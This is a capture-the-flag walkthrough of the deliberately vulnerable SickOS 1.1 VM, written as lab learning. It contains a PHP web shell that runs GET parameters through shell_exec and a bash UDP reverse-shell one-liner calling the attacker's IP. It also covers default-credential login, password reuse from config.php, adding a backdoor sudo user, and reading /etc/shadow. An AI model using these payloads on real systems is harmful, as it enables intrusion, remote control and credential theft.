# SickOS 1.1 Walkthrough (Getting root)
-----------------------------------------
- OS (Box): Ubuntu (SickOS 1.1 - https://www.vulnhub.com/entry/sickos-11,132/)
- Objective: Obtain root user, and find flag in /root/ directory (without using any walkthroughs).
-----------------------------------------

# 1. Nmap
- **We could not find the IP address for the box using ‘nmap -sn’ or ‘-Pn’ scan. But using sudo it is possible to scan for the box.**
  ```
  (kali@kali)-[~] $ nmap -sn 192.168.56.0/24 
  Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 15:14 ESTIU 
  Nmap scan report for (192.168.56.1) Host is up (0.00024s latency). 
  Nmap scan report for 192.168.56.3 cm Host is up (0.00013s latency). Nmap done: 256 IP addresses (2 hosts up) scanned in 2.97 seconds
  ```
  > 192.168.56.11 is identified as SickOS. (.1 is the host machine, .2 is the VirtualBox router (https://router-network.com/ip/192-168-56-2), and .3 is Kali.)

- **Using ‘nmap -sV’ we can see the running services. Squid proxy on Port 3128 seems promising, so let's look into that.**

  ```
  (kali@kali) - [~] $ sudo nmap -sV 192.168.56.11 
  Starting Nmap 7.91 ( https://nmap.org) at 2022-02-19 15:51 EST 
  Nmap scan report for 192.168.56.11 Host is up (0.00031s latency) 
  Not shown: 997 filtered ports PORT STATE SERVICE VERSION 
  22/tcp open ssh OpenSSH 5.9p1 Debian Subuntul.1 (Ubuntu Linux; protocol 2.0) 
  3128/tcp open http proxy Squid http proxy 3.1.19 
  8080/tcp closed http-proxy MAC Address: 08:00:27:AB:F1:24 (Oracle VirtualBox virtual NIC) Service Info: 05: Linux; CPE: cpe:/o:linux:linux kernel
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
  ```
-----------------------------------------

# 2. Proxy
- FoxyProxy is a Firefox extension which automatically switches an internet connection across one or more proxy servers based on URL patterns; put simply, FoxyProxy automates the manual process of editing Firefox's Connection Settings dialog.
Let’s use the extension to connect to the Squid http proxy by entering in the box’s IP address and Port 3128. We are able to connect to the proxy server without any type of authentication. Then we’re able to access the running web service, which is just a blank page with text.


  ![img](https://i.ibb.co/xMzxv0t/Screenshot-2.png)

  ![img](https://i.ibb.co/dM4qF3n/Screenshot-1.png)

-----------------------------------------

# 3. Dirb
- The tool ‘dirb’ (with -p specified) lists a few 200 codes for you to explore. The page robots.txt shows a disallow on /wolfcms/ therefore let’s look further into the box’s CMS. 

  ![img](https://i.ibb.co/jv1s4hd/Screenshot-1.png)

- Browsing online through Wolf CMS’s documentation, I noticed a config.php file that Wolf CMS creates during installation. So let’s dirb the /wolfcms directory to see if it’s there. And there it is.
(Wolf CMS Documentation: https://wolf-cms.readthedocs.io/en/latest/getting-started/installation/)

  ![img](https://i.ibb.co/pWqgzGN/Screenshot-3.png)
  > http://192.168.56.11/wolfcms/config (CODE:200|SIZE:403)

-----------------------------------------

# 4. Wolf CMS Login
- Regarding from the Wolf CMS’s documentation, we find ‘wolfcms/?/admin/login’ which is the admin login panel. Using the default credentials admin:admin, we can access the CMS as admin. Click around a bit (to understand how the CMS works) and you will find a page that allows file uploading.


  ![img](https://i.ibb.co/BT31Mx2/Screenshot-1.png)
  
-----------------------------------------

# 5. Wolf CMS File Upload and Permissions
- Let’s upload a php file randomly named yaya.php that will allow shell commands to be sent via a GET request. We can use this php script

  ```php
  <?php if (isset($_GET['cmd'])) { print(shell_exec($_GET['cmd'])); }
  ```
- In this PHP script, we set a function which checks if a variable is specified and not ‘NULL’ in a HTTP GET request. Then the ‘shell_exec’ function will execute commands via a shell, after a variable is specified (cmd); commands are positioned after cmd=. The php script executes and displays the results on the web page.

  ![img](https://i.ibb.co/BV2MZ3b/Screenshot-2.png)
  > This would execute commands on the server's backend that allow us to run commands on the box. For example, you can try cmd=pwd and it will return the current file path. (Note: We are still connected through the proxy.) ![img](https://i.ibb.co/7V9DLTg/Screenshot-1.png)

- However, you will soon find out that the current user does not have admin/sudo privileges. 
- Back under the Files tab, it seems we can change file permissions!

  ![img](https://i.ibb.co/ThmPYTz/Screenshot-3.png)
-----------------------------------------

# 6. Creating a Reverse Shell

- Using a shell will allow us to navigate more efficiently. So we can upload a file named test.sh with this script in the body:

  ```bash
  sh -i >& /dev/udp/192.168.56.3/1337 0>&1
  ```
  
  > This Bash UDP Reverse shell payload can be found on https://github.com/swisskyrepo/PayloadsAllTheThings

- We will edit our reverse shell payload by editing the IP Address to ours along with the specified port and change our malicious file permissions to 0777.

  ![img](https://i.ibb.co/jvJqYBH/Screenshot-1.png)

- Then we create a listener in Kali to receive the connection.

  ![img](https://i.ibb.co/2jrVWCk/Screenshot-1.png)

- Enter ‘bash test.sh’ after ‘cmd=’ (refer to Step #5 and remove quotes) into the search bar and establish a connection with our listener.

  ![img](https://i.ibb.co/GvV9Tz1/Screenshot-2.png)

- Run ‘whoami’ and we see the user ‘www-data’

  ![img](https://i.ibb.co/zm6616B/Screenshot-3.png)
  -----------------------------------------
  
# 7. Config.php

- Remember the config.php file earlier (refer to Step #3)? Let’s use ‘find / -name config.php’ (sudo find is not necessary here) to find it.

  ```
  find: /proc/1432/task/14327fd: 
  Permission denied find: /proc/1432/task/1432/fdinfo': 
  Permission denie find: /proc/1432/task/14327ns': 
  Permission denied find: /proc/1432/fd': 
  Permission denied find: /proc/1432/map files': 
  Permission denied find: /proc/1432/fdinfo': 
  Permission denied find: /proc/1432/ns': 
  Permission denied find: "/root': 
  Permission denied find: /etc/chatscripts': 
  Permission denied find: /etc/ssl/private': 
  Permission denied find: /etc/ppp/peers: 
  Permission denied find: /home/sickos/.cache': 
  Permission denied find: /home/tylenol/.cache: 
  Permission denied find: /var/lib/sudo': 
  Permission denied find: /var/lib/php5': 
  Permission denied find: /var/lib/mysql': 
  Permission denied find: /var/log/mysql: 
  Permission denied find: /var/log/apache2': 
  Permission denied find: /var/spool/cron/atspool': 
  Permission denied find: /var/spool/cron/crontabs': 
  Permission denied find: /var/spool/cron/atjobs': 
  Permission denied find: /var/cache/ldconfig': 
  Permission denied /var/www/wolfcms/config.php find: 7 lost+found': Permission denied
  ```
- Now let’s ‘cd’ to it. And using ‘ls’ we see the config.php file listed.
  ```
  $ cd /var/www/wolfcms 
  $ ls 
  CONTRIBUTING.md 
  README.md 
  composer.json 
  config.php 
  docs 
  favicon.ico 
  index.php 
  public 
  robots.txt 
  wolf
  ```
 - Now let’s ‘cat’ the file to see if there’s anything useful.
  ```
  $ cat config.php 
  <?php
  // Database information: I 
  // for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
  // The path can only be absolute path or memory: 
  // For more info look at: www.php.net/pdo
  // Database settings: 
  define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); 
  define('DB USER', 'root'); 
  define('DB PASS', 'john@123'); 
  define('TABLE_PREFIX', '');
  ```
  > root:john@123 looks good.
-----------------------------------------
 # 8. Logging In 
  
  - Let’s ‘cat’ the /etc/passwd file to see all users. It’s not a long list so we could brute force each username with ‘john@123’... However, by knowing that new users added to Ubuntu systems start with a UID of 1000 and up, let’s try the user sickos. And lucky for us, the password works!
    ```
    $cat /etc/passwd
    sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
    ```
    ![img](https://i.ibb.co/ypvR4TW/Screenshot-1.png)
-----------------------------------------

# 9. Persistence
  - By using the ‘id’ command on the user sickos, we are able to see that this user is in the sudo group.

    > ![img](https://i.ibb.co/51TxYDZ/Screenshot-2.png)
 
  - Now we want to create persistence by creating a new user ‘ukraine’ by entering ‘sudo adduser ukraine’.

  > ![img](https://i.ibb.co/kHs2h4k/Screenshot-1.png)

  - Then we give ‘ukraine’ admin privileges by adding it to the sudo group by entering ‘sudo usermod -aG sudo ukraine’. Finally, we can test sudo privileges by running ‘sudo cat /etc/shadow’; and it works.

  > ![img](https://i.ibb.co/VHQ07vf/Screenshot-2.png)

-----------------------------------------

# 10. Owning the Box
  - In order to prove that we have successfully gained root access, the creator on Vulnhub wanted us to cat the file /root/a0216ea4d51874464078c618298b1367.txt

  > ![img](https://i.ibb.co/TKj9F4m/Screenshot-3.png)

-----------------------------------------
-----------------------------------------
